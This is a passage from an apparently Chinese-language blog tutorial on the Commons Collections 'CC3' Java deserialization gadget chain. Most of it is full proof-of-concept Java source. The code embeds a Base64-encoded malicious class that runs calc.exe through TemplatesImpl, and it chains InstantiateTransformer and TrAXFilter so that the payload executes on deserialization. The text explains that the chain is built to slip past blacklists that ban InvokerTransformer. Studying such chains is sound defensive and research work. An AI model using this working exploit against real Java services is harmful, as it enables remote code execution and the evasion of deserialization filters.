InvokerTransformer手工调用 newTransformer() 方法这⼀步：</p><p><img src="https://bu.dusays.com/2024/06/07/66630a3c79cdb.png" alt="image-20240602175835431"></p><p>当然，缺少了InvokerTransformer，TrAXFilter的构造⽅法也是无法调用的。这里会用到⼀个新的 Transformer，就是 <code>org.apache.commons.collections.functors.InstantiateTransformer</code> 。 <code>InstantiateTransformer</code>也是⼀个实现了Transformer接口的类，他的作用就是调用构造方法。</p><p>所以，我们实现的目标就是，利用 <code>InstantiateTransformer</code> 来调用到 <code>TrAXFilter</code> 的构造方法，再利 用其构造方法里的 <code>templates.newTransformer()</code> 调用到 <code>TemplatesImpl</code> 里的字节码。</p><p>所以</p><p>就有了：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; obj &#125;)</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/06/07/66630a3ce7d70.png" alt="image-20240602180621461"></p><p>可以执行字节码</p><h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><p>好知道了demo</p><p>我们就可以根据这个demo来编写一个完整的CC3链</p><p>其实就和前面的CC1链差不多</p><p>这个demo也有CommonsCollections1⼀样的问题，就是只支持Java 8u71及以下版本可以根据CC6来通杀Java 7和Java 8</p><p>先来8u71一下的</p><h3 id="8u71以下的"><a href="#8u71以下的" class="headerlink" title="8u71以下的"></a>8u71以下的</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA4ADwcAHAwAHQAeAQAIY2FsYy5leGUMAB8AIAEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAGQAAAAMAAAABsQAAAAEACgAAAAYAAQAAAA8ACwAAAAQAAQAMAAEABwANAAIACQAAABkAAAAEAAAAAbEAAAABAAoAAAAGAAEAAAAUAAsAAAAEAAEADAABAA4ADwACAAkAAAAuAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAEACgAAAA4AAwAAABUABAAWAA0AFwALAAAABAABABAAAQARAAAAAgAS&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldVaule(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldVaule(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;adam&quot;</span>);</span><br><span class="line">        setFieldVaule(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// fake的</span></span><br><span class="line">        Transformer[] faketransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Transformer transformerChain = new ChainedTransformer(transformers);</span></span><br><span class="line">        <span class="comment">//先使用fake</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(faketransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line"><span class="comment">//        outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//换为真的</span></span><br><span class="line">        setFieldVaule(transformerChain,<span class="string">&quot;iTransformers&quot;</span>,transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes1 = serialize(handler);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(bytes1));</span><br><span class="line">        unserialize(bytes1);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes); <span class="comment">// 这个是写入，自然是先流进来的。所以它要有参数</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);<span class="comment">//将流进行反序列化的，所以需要流流入，所以他需要一个参数</span></span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();<span class="comment">//输出的，数据流入它，所以它是作为其他流的输入的。它最后是输出用的</span></span><br><span class="line">        <span class="comment">// 这里是用 ByteArrayOutputStram()来盛放。</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);<span class="comment">//ObjectOutputStram(new FileOutputStream)一定要有一个输出兑现，他要把生成的字节给一个东西放着，</span></span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldVaule</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/06/07/66630a3e788a3.png" alt="image-20240602182357462"></p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>我们来分析一下</p><p>和demo一样</p><h5 id="poc中demo部分"><a href="#poc中demo部分" class="headerlink" title="poc中demo部分"></a>poc中demo部分</h5><p>cc1：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> aa;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc3test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>字节码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">hellotest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, TransformerConfigurationException &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA4ADwcAHAwAHQAeAQAIY2FsYy5leGUMAB8AIAEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAGQAAAAMAAAABsQAAAAEACgAAAAYAAQAAAA8ACwAAAAQAAQAMAAEABwANAAIACQAAABkAAAAEAAAAAbEAAAABAAoAAAAGAAEAAAAUAAsAAAAEAAEADAABAA4ADwACAAkAAAAuAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAEACgAAAA4AAwAAABUABAAWAA0AFwALAAAABAABABAAAQARAAAAAgAS&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldVaule(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldVaule(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;adam&quot;</span>);</span><br><span class="line">        setFieldVaule(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldVaule</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将两个合并一下</p><p>成为了我们的demo</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc3test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA4ADwcAHAwAHQAeAQAIY2FsYy5leGUMAB8AIAEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAGQAAAAMAAAABsQAAAAEACgAAAAYAAQAAAA8ACwAAAAQAAQAMAAEABwANAAIACQAAABkAAAAEAAAAAbEAAAABAAoAAAAGAAEAAAAUAAsAAAAEAAEADAABAA4ADwACAAkAAAAuAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAEACgAAAA4AAwAAABUABAAWAA0AFwALAAAABAABABAAAQARAAAAAgAS&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldVaule(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldVaule(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;adam&quot;</span>);</span><br><span class="line">        setFieldVaule(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line"><span class="comment">//            new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;),</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>,<span class="literal">null</span>),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldVaule</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没问题</p><p><img src="https://bu.dusays.com/2024/06/07/66630a3c93974.png" alt="image-20240602182914893"></p><p>但是这只是demo</p><p>真正的CC3其实不是这样的</p><p>CC3 是为了 绕过一些规则对于 <code>InvokerTransformer</code> 的限制的，也就是说有一些反序列化的过滤器中的黑名单中有 <code>InvokerTransformer</code>，所以不使用<code>InvokerTransformer</code>的CC3才出现了。为了绕过黑名单的检测。</p><p>也就是我们前面说的<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code>类</p><p>这里就不赘述了</p><p>这里面当然没有InvokerTransformer了，我们也就没有办法调用反射来走TrAXFilet的构造方法了。</p><p>那么我们要使用的话，就需要<strong>在 TrAXFilter的构造参数中传入TemplatesImpl类了。然后就能够在 new TrAXFilter(TemplatesImpl)或者classloader.newInstance(TmplatesImpl) 的时候就执行了。</strong></p><p>那么我们就要找一个类，它在反序列化readObject() 的时候能够实例化 TrAXFilter这个类才行啊。而且传入的template要可控才行呢</p><p>或者不用它的readObject()。是这个过程中的一个方法也行。这个方法能够例化 TrAXFilter这个类才行啊。而且传入的template要可控</p><p>然后ysoserial的作者就找到了CommonsCollections中的这个InstantiateTransformer类：</p><p><img src="https://bu.dusays.com/2024/06/07/66630a3a7658b.png" alt="image-20240602183338277"></p><p>它继承自<code>Transformer</code>类，然后通过反射来创建一个对象</p><p>然后就有了我们demo中的修改部分</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;</span><br><span class="line">        )</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>最后</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc3test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span 